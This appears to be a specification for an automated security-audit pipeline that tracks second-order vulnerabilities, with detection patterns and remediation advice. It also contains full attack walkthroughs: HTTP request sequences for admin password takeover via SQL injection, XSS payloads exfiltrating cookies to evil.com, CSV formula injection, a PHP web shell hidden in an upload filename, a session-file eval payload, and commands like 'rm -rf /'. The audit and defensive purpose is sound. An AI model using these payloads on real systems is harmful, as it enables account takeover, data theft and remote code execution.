# Second-Order Vulnerability Tracking Specification

This document defines the tracking specification for second-order vulnerabilities (where the storage point and the usage point are separated). A second-order vulnerability occurs when malicious data is stored in one request and used unsafely in another request.

---

## Second-Order Vulnerability Types

### 1. Second-Order SQL Injection
- **Storage point**: User registration / profile update — malicious data written to database
- **Usage point**: Admin panel queries / report generation — data retrieved from database and directly concatenated into SQL
- **Example**: Register username `admin'-- ` → Triggers SQLi when admin searches users

### 2. Stored XSS
- **Storage point**: Comments / profiles / messages — malicious script written to database
- **Usage point**: Page rendering — data retrieved from database and output without escaping
- **Example**: Comment content `<script>...` → Triggers when other users view the page

### 3. Second-Order File Inclusion
- **Storage point**: File upload / config modification — malicious path written to database or config
- **Usage point**: Dynamic include/require — path read from database and included
- **Example**: Admin sets template name `../../etc/passwd` → Triggers LFI when system loads template

### 4. Second-Order Command Injection
- **Storage point**: Form input / API parameters — malicious command written to database
- **Usage point**: Scheduled tasks / background scripts — data retrieved from database and passed to system/exec
- **Example**: Filename contains `; rm -rf /` → Triggers when scheduled cleanup script executes

### 5. Second-Order Deserialization
- **Storage point**: Regular API — serialized data written to database / cache / Session
- **Usage point**: Subsequent request — data retrieved from storage and passed to unserialize()
- **Example**: Malicious serialized string stored in Session → Triggers on next request when Session is loaded

### 6. Second-Order SSRF
- **Storage point**: URL config / Webhook settings — malicious URL written to database
- **Usage point**: Background task / Webhook trigger — system reads URL and makes request
- **Example**: Webhook URL set to internal address → SSRF when event triggers

## Tracking Matrix

### Storage Point Identification

When analyzing **write endpoints**, auditors MUST record all storage locations for user-controllable data:

```json
{
  "store_id": "STORE-001",
  "endpoint": "POST /api/users/register",
  "param": "username",
  "storage": "database",
  "table": "users",
  "column": "username",
  "sanitization": "none|partial|full",
  "sanitization_detail": "string (sanitization function and location)",
  "max_length": "number|null",
  "encoding": "string (UTF-8/Latin1/etc.)"
}
```

### Usage Point Identification

When analyzing **read endpoints**, auditors MUST check how data retrieved from storage is used:

```json
{
  "use_id": "USE-001",
  "endpoint": "GET /admin/users/search",
  "source_table": "users",
  "source_column": "username",
  "usage_sink": "DB::raw()",
  "usage_file": "app/Http/Controllers/Admin/UserController.php",
  "usage_line": 67,
  "output_sanitization": "none|partial|full",
  "output_sanitization_detail": "string"
}
```

### Correlation Analysis

When a **storage point's** `(table, column)` matches a **usage point's** `(source_table, source_column)`, and the following conditions are met, it SHALL be flagged as a second-order vulnerability candidate:

1. Insufficient sanitization at storage point (`sanitization` = "none" or "partial")
2. Insufficient sanitization at usage point (`output_sanitization` = "none" or "partial")
3. Sanitization mismatch between storage and usage (HTML encoding at storage → SQL concatenation at usage, encoding is ineffective)

### Correlation Files

Each auditor writes storage points and usage points to:
- `$WORK_DIR/second_order/store_points.jsonl` — Storage point records
- `$WORK_DIR/second_order/use_points.jsonl` — Usage point records
- `$WORK_DIR/second_order/correlations.json` — Correlation analysis results (generated by correlation_engine)

## Auditor Responsibilities

| Auditor | Storage Point Recording | Usage Point Recording |
|--------|-----------|-----------|
| sqli-auditor | All user-controllable fields in INSERT/UPDATE | All locations where data from DB is concatenated into SQL |
| xss-auditor | All user input written to DB | All locations where data from DB is output to HTML |
| rce-auditor | All user input written to DB/files | All locations where data from DB/files is passed to command execution |
| lfi-auditor | All paths/filenames written to DB/config | All locations where data from DB/config is used in include |
| ssrf-auditor | All URLs written to DB | All locations where data from DB is used in HTTP requests |
| deserial-auditor | All data stored after serialize() | All data retrieved from storage via unserialize() |

## Testing Process

1. **Phase 4 analysis stage**: Each auditor records storage points and usage points
2. **correlation_engine**: Automatic correlation analysis, generates candidate second-order vulnerability list
3. **Phase 4 attack stage**: Execute two-step verification for candidate second-order vulnerabilities:
   - Step 1: Send malicious data to the storage point
   - Step 2: Trigger the usage point, verify whether the malicious data is used unsafely
4. **QA reviewer**: Verify the causal relationship of the two-step operation

## Constraints

- Second-order vulnerability tests MUST **provide both the storage request and trigger request** as evidence
- Stored malicious data MUST use identifiable markers for verification at the usage point
- env-cleaner cleans up stored malicious data after testing
- Record the complete data lifecycle in the system (storage → persist → retrieval → usage)

## Second-Order SQLi Detailed Attack Flow

The core of second-order SQL injection is: the malicious payload causes no anomaly at storage time (usually correctly parameterized into the database), but triggers injection when subsequently retrieved and concatenated into a new SQL statement.

### Scenario 1: Register malicious username → Login → View profile triggers

**Attack Steps:**

1. Attacker registers a username containing a SQL injection payload
2. Normal login (at this point the payload is merely stored as a string in the `users.username` column)
3. When an admin or the system views the user profile, the username is retrieved from the database and directly concatenated into a query, triggering injection

**Step 1 — Register malicious username (storage point)**

```http
POST /register HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123

username=admin'--+&password=Password123!&email=attacker@evil.com&submit=Register
```

Response:

```http
HTTP/1.1 302 Found
Location: /login.php
Set-Cookie: PHPSESSID=def456; path=/

<!-- Registration successful, username admin'--+ is safely stored via parameterized INSERT -->
<!-- INSERT INTO users (username, password, email) VALUES (?, ?, ?) -->
<!-- No SQLi at this point; the payload is just stored as a regular string -->
```

**Step 2 — Normal login**

```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--+&password=Password123!&submit=Login
```

**Step 3 — View profile triggers SQLi (usage point)**

When the user visits the profile page, the backend code retrieves the username from session/database and directly concatenates it:

```php
// Vulnerable code example
$user = $_SESSION['username']; // Retrieved from session: admin'--+
$sql = "SELECT * FROM user_profiles WHERE username = '$user'";
// Actually executes: SELECT * FROM user_profiles WHERE username = 'admin'--+'
// '--+' comments out the rest, query becomes a lookup for the admin user's profile
$result = $db->query($sql);
```

```http
GET /profile.php HTTP/1.1
Host: target.example.com
Cookie: PHPSESSID=def456
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<!-- Returns admin user's profile instead of admin'--+ profile -->
<!-- This confirms SQL injection succeeded; attacker can read arbitrary user data -->
<h1>User Profile</h1>
<p>Username: admin</p>
<p>Email: admin@target.example.com</p>
<p>Role: administrator</p>
```

### Scenario 2: Register malicious username → Password change triggers → Admin password overwritten

**Attack principle:** Attacker registers a username of `admin'--`. When executing a password change, the backend concatenates the username into the UPDATE statement, causing the admin account's password to be overwritten.

**Step 1 — Register malicious username**

```http
POST /register HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=InitPass123&email=hacker@evil.com&submit=Register
```

Response:

```http
HTTP/1.1 302 Found
Location: /login.php

<!-- User admin'-- created successfully -->
```

**Step 2 — Login and change password (trigger point)**

```http
POST /change_password.php HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=xyz789

current_password=InitPass123&new_password=Hacked999!&confirm_password=Hacked999!
```

Backend vulnerable code:

```php
// change_password.php — Vulnerable code
$username = $_SESSION['username']; // Retrieved: admin'--
$new_pass = password_hash($_POST['new_password'], PASSWORD_BCRYPT);

// Directly concatenates username into UPDATE statement
$sql = "UPDATE users SET password = '$new_pass' WHERE username = '$username'";
// Actually executes: UPDATE users SET password = '$2y$...' WHERE username = 'admin'--'
// '--' comments out the rest; this actually modifies admin's password!
$db->query($sql);
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<div class="alert alert-success">Password changed successfully!</div>
<!-- At this point admin account's password has been changed to Hacked999! -->
<!-- Attacker can log in to admin panel with admin / Hacked999! -->
```

**Step 3 — Login as admin using overwritten password**

```http
POST /login HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=Hacked999!&submit=Login
```

Response:

```http
HTTP/1.1 302 Found
Location: /admin/dashboard.php
Set-Cookie: PHPSESSID=admin_session_hijacked; path=/

<!-- Successfully logged in as admin! Second-order SQLi complete -->
```

### Scenario 3: Stored search conditions → Scheduled task triggers

User-defined search conditions/filters are stored in the database. A scheduled report task retrieves these conditions from the database and directly concatenates them into SQL for execution.

```php
// Storage point — Save custom report filter conditions
// POST /api/reports/filters { "filter_name": "my_report", "condition": "status = 'active' OR 1=1--" }
// INSERT INTO saved_filters (user_id, name, condition) VALUES (?, ?, ?)  — Safely stored

// Usage point — Scheduled task cron_report_generator.php
$filters = $db->query("SELECT condition FROM saved_filters WHERE active = 1");
foreach ($filters as $f) {
    // Directly concatenates user-saved condition into query
    $sql = "SELECT * FROM orders WHERE {$f['condition']}";
    // Executes: SELECT * FROM orders WHERE status = 'active' OR 1=1--
    // Returns all order data, including other users' private orders
    $results = $db->query($sql);
    send_report_email($results);
}
```

## Second-Order XSS Patterns

Second-order XSS (an extended form of Stored XSS) is characterized by: the malicious script is not executed in the context where it is stored, but is triggered in a **different context** (such as admin panel, export files).

### Pattern 1: Stored XSS triggered via admin panel (user profile → admin views)

**Attack chain:** Normal user submits malicious data → Data stored in database → XSS triggered when admin views in backend

**Typical scenarios:**

- User injects XSS payload in profile fields such as "nickname", "signature", "address"
- The frontend applies `htmlspecialchars()` escaping to these fields, so they don't trigger on normal user pages
- But the admin backend uses a different template engine or output method, outputting without escaping

```php
// Frontend — Safe output (does not trigger)
echo htmlspecialchars($user['nickname']); // &lt;script&gt;...

// Backend admin/user_detail.php — Unescaped output (triggers!)
echo "<td>" . $user['nickname'] . "</td>";
// If nickname = <script>document.location='http://evil.com/steal?c='+document.cookie</script>
// When admin opens this page, cookie is sent to attacker's server
```

**High-value targets:** Admin session cookies typically have higher privileges; attacker can use stolen admin cookies to:
- Create new admin accounts
- Modify system configuration
- Export all user data
- Execute server management operations

### Pattern 2: Stored XSS triggered via email/export (data write → PDF/Excel generation)

**Attack chain:** User inputs malicious data → Data stored in database → Triggered when system exports to PDF/Excel/CSV

**PDF generation scenario (using wkhtmltopdf / Dompdf etc.):**

```php
// Order export function — Retrieves order notes from database, generates PDF
$orders = $db->query("SELECT * FROM orders WHERE date > '2024-01-01'");

$html = "<html><body><table>";
foreach ($orders as $order) {
    // order_note field contains user-submitted notes, unescaped
    $html .= "<tr><td>{$order['order_note']}</td></tr>";
    // If order_note = <script>fetch('http://evil.com/exfil?data='+document.body.innerHTML)</script>
}
$html .= "</table></body></html>";

// wkhtmltopdf will execute JavaScript in the HTML!
$pdf = new Dompdf();
$pdf->loadHtml($html);
$pdf->render(); // XSS payload executes in the PDF rendering engine
```

**Excel/CSV injection scenario (CSV Injection / Formula Injection):**

```php
// User export function — Retrieves data from database to generate CSV
$users = $db->query("SELECT username, email, phone FROM users");

$fp = fopen('php://output', 'w');
header('Content-Type: text/csv');
header('Content-Disposition: attachment; filename="users.csv"');

foreach ($users as $user) {
    // If username = =cmd|'/C calc.exe'!A1
    // When admin opens this CSV in Excel, it pops up calculator (or executes arbitrary commands)
    fputcsv($fp, [$user['username'], $user['email'], $user['phone']]);
}
```

**Defense key point:** When exporting data, prefix each cell value with `'` (single quote) or `\t` (Tab) to prevent formula parsing.

## Second-Order File Inclusion Patterns

Second-order file inclusion occurs when a malicious path/content is written to logs, session, or database in one operation, and loaded via `include`/`require` in another operation for execution.

### Pattern 1: Upload filename injection → Log recording → LFI include log

**Attack chain:** Upload file (with malicious filename) → Filename written to log → LFI vulnerability includes log file → Malicious code executed

**Step 1 — Upload file with PHP code in filename**

Attacker sets the filename to a string containing PHP code when uploading:

```http
POST /upload.php HTTP/1.1
Host: target.example.com
Content-Type: multipart/form-data; boundary=--Boundary
Cookie: PHPSESSID=abc123

----Boundary
Content-Disposition: form-data; name="file"; filename="<?php system($_GET['cmd']); ?>.jpg"
Content-Type: image/jpeg

[JFIF binary data here]
----Boundary--
```

**Step 2 — Filename is recorded in log**

```php
// upload.php — Records upload log
$filename = $_FILES['file']['name']; // <?php system($_GET['cmd']); ?>.jpg
error_log("File uploaded: $filename", 3, "/var/log/app/upload.log");
// upload.log now contains: File uploaded: <?php system($_GET['cmd']); ?>.jpg
```

**Step 3 — LFI includes log file (trigger point)**

If the application has an LFI vulnerability (e.g., includes files via `page` parameter):

```http
GET /index.php?page=../../../var/log/app/upload.log&cmd=id HTTP/1.1
Host: target.example.com
```

```php
// index.php — Vulnerable code
$page = $_GET['page'];
include($page); // include("/var/log/app/upload.log")
// PHP engine parses the log file, encounters <?php system($_GET['cmd']); ?> tag
// Executes system('id'), returns: uid=33(www-data) gid=33(www-data)
```

### Pattern 2: Session data injection → Session file include

**Attack chain:** User injects PHP code into session data via controllable input → LFI includes session file → Code execution

**Step 1 — Inject PHP code into Session**

```http
POST /preferences.php HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=attacker_session_id_123

language=<?php+eval($_POST['c']);+?>&theme=dark
```

```php
// preferences.php — Stores user preferences into Session
$_SESSION['language'] = $_POST['language']; // Malicious PHP code stored in session
// Session file: /tmp/sess_attacker_session_id_123
// File content: language|s:30:"<?php eval($_POST['c']); ?>";theme|s:4:"dark";
```

**Step 2 — LFI includes Session file**

```http
POST /index.php?page=../../../tmp/sess_attacker_session_id_123 HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded

c=system('cat /etc/passwd');
```

When the PHP engine parses the session file, it encounters the `<?php eval($_POST['c']); ?>` tag and executes it; the attacker gains RCE.

**Key prerequisites:**
- Need to know the session file storage path (common: `/tmp/`, `/var/lib/php/sessions/`)
- Need to know or be able to control the session ID (obtainable via Cookie header)
- Need an LFI vulnerability (`include` with user-controllable path)

## Detection (Second-Order Vulnerability Code Pattern Recognition)

### Core Code Pattern: "Retrieved from database then directly concatenated"

The root cause of second-order vulnerabilities is **trusting data from database/storage**. Identify the following code patterns:

**Pattern 1 — DB data → SQL concatenation (Second-Order SQLi)**

```php
// DANGEROUS: Data retrieved from database directly concatenated into new SQL statement
$row = $db->query("SELECT username FROM users WHERE id = ?", [$id])->fetch();
$sql = "SELECT * FROM logs WHERE actor = '{$row['username']}'"; // Second-order SQLi!
```

**Pattern 2 — DB data → HTML output without escaping (Second-Order XSS)**

```php
// DANGEROUS: Data retrieved from database output to HTML without escaping
$user = $db->query("SELECT bio FROM profiles WHERE user_id = ?", [$id])->fetch();
echo "<div class='bio'>" . $user['bio'] . "</div>"; // Second-order XSS!
```

**Pattern 3 — DB data → Shell command (Second-Order Command Injection)**

```php
// DANGEROUS: Data retrieved from database passed into shell command
$task = $db->query("SELECT filename FROM tasks WHERE id = ?", [$id])->fetch();
system("convert " . $task['filename'] . " output.png"); // Second-order RCE!
```

**Pattern 4 — DB/Session/Log data → include/require (Second-Order LFI)**

```php
// DANGEROUS: Path retrieved from database or other storage used for file inclusion
$config = $db->query("SELECT template FROM settings WHERE id = 1")->fetch();
include($config['template']); // Second-order LFI!
```

### Common Trigger Scenario Checklist

During auditing, focus on the following scenarios as they are high-frequency areas for second-order vulnerabilities:

| Trigger Scenario | Storage Point Example | Usage Point Example | Common Vulnerability Type |
|----------|-----------|-----------|-------------|
| **Password change** | Username at registration | `UPDATE ... WHERE username = '$user'` | Second-order SQLi |
| **Profile export** | User nickname/signature/address | PDF/Excel/CSV generation without escaping | Second-order XSS, CSV Injection |
| **Admin panel view** | Any field submitted by normal users | echo output in admin panel | Second-order XSS |
| **Scheduled tasks/Cron** | User-saved search conditions/rules | Scheduled query concatenating SQL | Second-order SQLi |
| **Log viewer** | Any user input written to logs | Log page direct output / LFI include | Second-order XSS, Second-order LFI |
| **Email sending** | Username / order notes | Email template concatenating HTML | Second-order XSS |
| **Webhook/callback** | User-configured URL/params | System makes HTTP request | Second-order SSRF |
| **API response** | Stored config/template strings | JSON/XML concatenation output | Second-order injection |

### How to Distinguish First-Order from Second-Order Vulnerabilities

| Characteristic | First-Order Vulnerability | Second-Order Vulnerability |
|------|----------------------|------------------------|
| **Data flow** | Input → direct use | Input → storage → retrieval → use |
| **Request count** | Single request can trigger | Requires at least two requests (storage + trigger) |
| **Time interval** | Triggered immediately | May be hours/days apart (e.g., scheduled tasks) |
| **Triggered by** | Attacker themselves | May be triggered by other users / admin / system |
| **Scanner detection** | Easily detected by automated scanners | Nearly undetectable by automated scanners |
| **Data source** | `$_GET`, `$_POST`, `$_COOKIE`, etc. | `$db->query()`, `$_SESSION`, `file_get_contents()`, etc. |
| **Remediation key** | Sanitize/parameterize at input point | Sanitize/parameterize at **every usage point** (MUST NOT trust data from database) |

**Core principle:** Never trust data retrieved from any storage (database, Session, file, cache). Even if data was validated at storage time, appropriate escaping/parameterization MUST still be applied at usage time based on the current context.
